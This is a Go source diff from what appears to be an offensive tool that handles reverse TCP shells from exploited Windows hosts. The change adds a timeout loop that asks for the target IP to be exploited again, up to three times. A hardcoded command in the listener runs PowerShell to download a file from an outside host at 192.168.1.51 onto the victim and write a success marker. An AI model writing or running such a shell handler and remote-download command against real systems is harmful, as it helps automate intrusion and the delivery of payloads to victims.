@@ -7,13 +7,13 @@ import (
   "time"
 )
 
-func ListenForConnection(listener net.Listener) net.Conn {
+func ListenForConnection(listener net.Listener, connchan chan net.Conn) {
   conn, err := listener.Accept()
   if err != nil {
     fmt.Println("we gotta connection accept error boss, " + err.Error())
   }
   fmt.Println("TCP connection accepted")
-  return conn
+  connchan <- conn
 }
 
 func CloseConnectionLoudly(conn net.Conn) {
@@ -21,14 +21,33 @@ func CloseConnectionLoudly(conn net.Conn) {
   fmt.Println("Connection closed")
 }
 
-func ListenAndHandleTCPShell(listener net.Listener){
+func ListenAndHandleTCPShell(listener net.Listener, ip string, exploit_request_channel chan string){
   command := "C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -C \"(new-object Net.WebClient).DownloadFile('http://192.168.1.51/index.html', 'C:\\downloado.txt')\" && echo succ > C:\\succ.txt"
   fmt.Println("Listening for reverse TCP shell...")
-
-  conn := ListenForConnection(listener)
+  i := 0
+  connchan := make(chan net.Conn)
+  var conn net.Conn
+  go ListenForConnection(listener, connchan)
+  for{
+    select{
+    case conn = <- connchan:
+      i = -1
+    case <- time.After(3000 * time.Millisecond):
+      fmt.Println("No connection found, attempting to exploit again")
+      exploit_request_channel <- ip
+    }
+    if i == -1 {
+      break
+    }
+    i++
+    if i == 3 {
+      fmt.Println("Failed to exploit target after 3 tries: " + ip)
+      conn.Close()
+      return
+    }
+  }
   reader := bufio.NewReader(conn)
   writer := bufio.NewWriter(conn)
-
 
   _, readerr := reader.ReadString('>')
   if readerr != nil {
